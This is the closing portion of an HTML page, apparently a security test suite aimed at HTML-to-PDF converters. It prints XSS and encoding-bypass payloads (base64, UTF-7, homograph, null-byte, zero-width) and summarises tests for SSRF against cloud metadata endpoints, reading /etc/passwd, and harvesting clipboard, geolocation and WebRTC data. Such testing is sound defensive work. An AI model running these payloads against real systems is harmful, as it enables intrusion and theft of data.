+[HTML ENTITIES]
+Original: <script>alert(1)</script>
+Encoded:  &lt;script&gt;alert(1)&lt;/script&gt;
+
+[BASE64]
+Original: <script>alert(1)</script>
+Encoded:  ${btoa('<script>alert(1)</script>')}
+Decoded:  ${atob(btoa('<script>alert(1)</script>'))}
+
+[UNICODE NORMALIZATION]
+Original: cript (U+017F - long s)
+NFKC:     ${'cript'.normalize('NFKC')}
+
+[ZERO-WIDTH CHARACTERS]
+String:   a\u200Bb\u200Cc\u200Dd\uFEFF
+Visible:  4 chars, Actual: ${('a\u200Bb\u200Cc\u200Dd\uFEFF').length} chars
+Detected: ${('a\u200Bb\u200Cc\u200Dd\uFEFF').length>4?'  Zero-width present':' Clean'}
+
+[HOMOGRAPH ATTACK]
+Fake:     pple.com (Cyrillic '')
+Real:     apple.com (Latin 'a')
+CharCode: ${('pple.com')[0].charCodeAt(0)} vs ${('apple.com')[0].charCodeAt(0)}
+Match:    ${('pple.com')==('apple.com')?' Same':'  Different domains!'}
+
+[UTF-7]
+Payload:  +ADw-script+AD4-alert(1)+ADw-/script+AD4-
+Note:     Legacy encoding, rarely supported
+
+[NULL BYTE]
+String:   file.txt\x00.pdf
+Length:   ${('file.txt\x00.pdf').length}
+Detected: ${('file.txt\x00.pdf').includes('\x00')?'  Null byte present':' Clean'}
+`;
+
+document.getElementById('encoding-result').innerHTML='<span class="warning">  ENCODING TESTS COMPLETE</span>';
+document.getElementById('encoding-data').textContent=encodingTests;
+</script>
+</div>
+</section>
+
+<section id="summary">
+<h2> TEST SUITE SUMMARY</h2>
+<div class="test-box" style="background:#1a3a1a;border-color:#0f0">
+<div class="metadata">
+<div class="metadata-key">Total Categories:</div><div class="metadata-val">6 Major Attack Vectors</div>
+<div class="metadata-key">Test Cases:</div><div class="metadata-val">60+ Individual Tests</div>
+<div class="metadata-key">Data Extracted:</div><div class="metadata-val">ALL AVAILABLE</div>
+<div class="metadata-key">Output Format:</div><div class="metadata-val">PDF-Ready Raw Data</div>
+</div>
+<div class="label" style="margin-top:20px">Attack Vectors Tested:</div>
+<div class="data">
+ SSRF - AWS/Azure/GCP metadata, port scanning, internal DNS
+ LFI - /etc/passwd, Windows hosts, environment vars, PHP filters
+ Data Exfil - WebRTC IPs, geolocation, clipboard, battery
+ Fingerprinting - Complete browser profile, canvas, WebGL, fonts
+ XSS - eval(), Function(), innerHTML, prototype pollution
+ Encoding - All bypass techniques with examples
+</div>
+<div class="label">Recommendations:</div>
+<div class="data" style="border-left-color:#f00">
+  Review ALL   marked results - these indicate security gaps
+ Green checkmarks indicate properly blocked attacks
+Convert this page to PDF to capture all discovered data
+Compare results before/after implementing mitigations
+</div>
+</div>
+</section>
+
+<script>
+console.log('%cPDF Security Test Suite Loaded','color:#0f0;font-size:20px;font-weight:bold');
+console.log('All tests running... Check page for results');
+setTimeout(()=>{
+  document.body.style.borderTop='10px solid #0f0';
+  console.log('%cTest Suite Complete - Review Output Above','color:#f00;font-size:16px;font-weight:bold');
+},6000);
+</script>
+<script defer src="https://static.cloudflareinsights.com/beacon.min.js/vcd15cbe7772f49c399c6a5babf22c1241717689176015" integrity="sha512-ZpsOmlRQV6y907TI0dKBHq9Md29nnaEIPlkf84rnaERnq6zvWvPUqr2ft8M1aS28oN72PdrCzSjY4U6VaAw1EQ==" data-cf-beacon='{"rayId":"9cc87cd82f21f0d6","serverTiming":{"name":{"cfExtPri":true,"cfEdge":true,"cfOrigin":true,"cfL4":true,"cfSpeedBrain":true,"cfCacheStatus":true}},"version":"2025.9.1","token":"642255d447fd46dbbcd67f3ff9dbdf59"}' crossorigin="anonymous"></script>
+</body>
+</html>
